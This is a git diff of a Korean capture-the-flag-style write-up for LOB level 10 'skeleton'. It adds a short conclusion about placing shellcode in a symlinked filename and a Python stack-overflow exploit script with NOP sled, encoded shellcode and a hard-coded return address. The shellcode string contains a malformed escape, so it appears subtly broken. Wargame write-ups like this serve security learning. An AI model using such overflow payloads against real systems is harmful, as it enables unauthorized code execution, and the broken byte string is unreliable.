@@ -3,7 +3,7 @@ title: "[LOB]Level10. skeleton"
 tags: [LOB, writeup]
 author: eli_ez3r
 key: 20180830
-modify_date: 2018-08-30
+modify_date: 2019-11-13
 article_header:
   type: cover
   image:
@@ -203,3 +203,34 @@ bash$
 ### 0x03. 정리
 
 이 문제에서 **실제 실행되는 파일의 이름은 스택 최상단에 저장되어 있으며 이는 초기화 할 수 없음**을 확인 할 수 있는 문제였다.
+
+그리고 이름에 심볼릭 링크를 설정할 때 ShellCode 뒤에 일정 공간을 만들어 줘야 ShellCode가 잘 실행되었다.
+
+-----
+
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\x\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
+
+target = "\x90"*50 + shellcode + "\x90"*32
+
+shellcode_addr = 0xbfffff80
+
+payload = "\x90"*44
+payload = append(p32(shellcode_addr))
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
+```
+
+-----
+
